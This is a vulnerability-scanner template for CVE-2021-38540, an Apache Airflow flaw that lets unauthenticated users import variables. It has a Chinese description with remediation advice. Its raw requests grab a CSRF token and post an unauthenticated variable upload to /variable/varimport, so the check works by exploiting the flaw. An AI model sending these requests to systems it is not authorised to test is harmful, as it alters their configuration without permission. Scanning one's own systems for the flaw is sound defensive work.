id: CVE-2021-38540
info:
  name: Apache Airflow - Unauthenticated Variable Import
  author:
  - l0ne1y
  description: |-
    Apache Airflow授权问题漏洞
    Apache Airflow是美国阿帕奇（Apache）基金会的一套用于创建、管理和监控工作流程的开源平台。该平台具有可扩展和动态监控等特点。

    Apache Airflow 中存在授权问题漏洞，该漏洞源于产品的import端点缺少授权保护。攻击者可通过该漏洞在DAG中添加或修改变量导致拒绝服务、信息泄露或代码执行。以下产品及版本受到影响：Apache Airflow 2.0.0 版本至 2.1.2版本。
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://lists.apache.org/thread.html/rb34c3dd1a815456355217eef34060789f771b6f77c3a3dec77de2064%40%3Cusers.airflow.apache.org%3E

    临时修复方案：
    1、调用import端点功能前验证用户是否有权限调用相关功能。
    2、前后端同时对用户输入信息进行校验，双重验证机制。
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - contains(body_1, "Sign In - Airflow")
    - status_code_2 == 302
    - contains(all_headers_2, "session=.")
  - type: word
    words:
    - 'You should be redirected automatically to target URL: <a href="/">'
  extractors:
  - name: csrf
    type: regex
    regex:
    - type="hidden" value="(.*?)">
    group: 1
    internal: true
  matchers-condition: and
  raw:
  - |
    GET /login/ HTTP/1.1
    Host: {{Hostname}}
    Origin: {{BaseURL}}
  - |
    POST /variable/varimport HTTP/1.1
    Host: {{Hostname}}
    Origin: {{RootURL}}
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB874qcjbpxTP1Hj7
    Referer: {{RootURL}}/admin/variable/

    ------WebKitFormBoundaryB874qcjbpxTP1Hj7
    Content-Disposition: form-data; name="csrf_token"

    {{csrf}}
    ------WebKitFormBoundaryB874qcjbpxTP1Hj7
    Content-Disposition: form-data; name="file"; filename="{{randstr}}.json"
    Content-Type: application/json

    {
        "type": "{{randstr}}"
    }

    ------WebKitFormBoundaryB874qcjbpxTP1Hj7--
  cookie-reuse: true
  req-condition: true
